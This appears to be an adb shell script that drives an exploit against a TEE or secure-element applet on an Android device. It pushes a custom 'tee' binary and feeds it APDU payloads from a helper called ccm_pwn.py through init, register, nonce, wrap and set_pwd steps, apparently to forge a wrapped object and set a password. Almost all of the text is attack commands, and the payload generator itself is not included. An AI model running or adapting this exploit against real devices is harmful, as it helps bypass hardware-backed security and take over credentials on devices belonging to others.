adb push tee /data/local/tmp/.
adb shell chmod 775 /data/local/tmp/tee

adb shell rm /data/local/tmp/output.bin
adb shell rm /data/local/tmp/apdu.bin

#just in case, run init and register
python ccm_pwn.py init
adb push apdu.bin /data/local/tmp/.
adb shell /data/local/tmp/tee 3

python ccm_pwn.py reg
adb push apdu.bin /data/local/tmp/.
adb shell /data/local/tmp/tee 3

#generate nonce getting apdu
python ccm_pwn.py nonce
adb push apdu.bin /data/local/tmp/.
#run cmd
adb shell /data/local/tmp/tee 1
#get result
adb pull /data/local/tmp/output.bin .

#generate wrapped obj using nonce
python ccm_pwn.py wrap
adb push apdu.bin /data/local/tmp/.
#run cmd
adb shell /data/local/tmp/tee 2
#get result
adb pull /data/local/tmp/output.bin .

#now set_pwd command using wrapped obj
python ccm_pwn.py setpwd
adb push apdu.bin /data/local/tmp/.
#run cmd
adb shell /data/local/tmp/tee 3
#no need for result

